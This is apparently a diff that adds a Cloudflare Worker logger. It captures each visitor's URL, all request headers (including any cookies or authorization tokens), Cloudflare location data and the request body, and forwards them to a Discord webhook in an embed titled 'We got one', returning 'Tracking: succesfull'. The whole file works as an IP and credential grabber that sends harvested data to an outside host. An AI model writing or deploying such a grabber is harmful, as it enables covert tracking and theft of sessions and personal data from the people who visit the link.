@@ -1,0 +1,102 @@
+export default {
+  async fetch(request, env) {
+    return await handleRequest(request)
+  }
+}
+
+let myembed = {
+    title: `We got one`,
+    fields: [],
+}
+
+function addfield(naam, valuu){
+  try{
+    myembed.fields.push(
+        {
+            name: naam,
+            value: valuu,
+        },
+    )
+  }
+    catch (e){
+      return
+    }
+}
+async function readRequestBody(request) {
+  try{
+    return JSON.stringify(await request.json());
+  }catch{
+    return ""
+  }
+}
+
+async function handleRequest(request) {
+    myembed = {
+        title: `We got one`,
+        fields: [],
+    }
+
+addfield('weburl', `${request.url}`);
+
+  try{
+    for (const [key, value] of request.headers) {
+        addfield(`${key}`, `${value}`);
+    }
+  }catch(e){}
+
+  try{
+    for (const [key, value] of request.cf) {
+        addfield(`${key}`, `${value}`);
+    }
+  }catch(e){}
+
+let customboddy = await readRequestBody(request);
+  try{
+    for (const [key, value] of Object.entries(JSON.parse(customboddy))) {
+        addfield(`${key}`, `${value}`);
+    }
+  }catch(e){}
+
+  
+  
+  const webhookBody = {
+      embeds: [myembed],
+  };
+
+
+  await sendDiscordWebhook(webhookBody);
+  
+
+let requestdata = {"ip": request.headers.get("CF-Connecting-IP"),'Tracking': 'succesfull', "Data":myembed.fields};
+
+
+
+
+  const response = new Response(JSON.stringify(requestdata), {
+    headers: {
+        "Content-Type": "application/json",
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Headers": "Content-Type, Authorization, Origin",
+        },
+    });
+  return response;
+}
+
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks";
+const DISCORD_WEBHOOK_ID = "discordid";
+const DISCORD_WEBHOOK_TOKEN = "discord token";
+
+const sendDiscordWebhook = async (webhookBody) => {
+	const webhook = await fetch(`${DISCORD_WEBHOOK_URL}/${DISCORD_WEBHOOK_ID}/${DISCORD_WEBHOOK_TOKEN}`, {
+		headers: {
+			'content-type': 'application/json;charset=UTF=8',
+		},
+		method: 'POST',
+		body: JSON.stringify(webhookBody),
+	});
+	return webhook;
+};
+
+
+
+
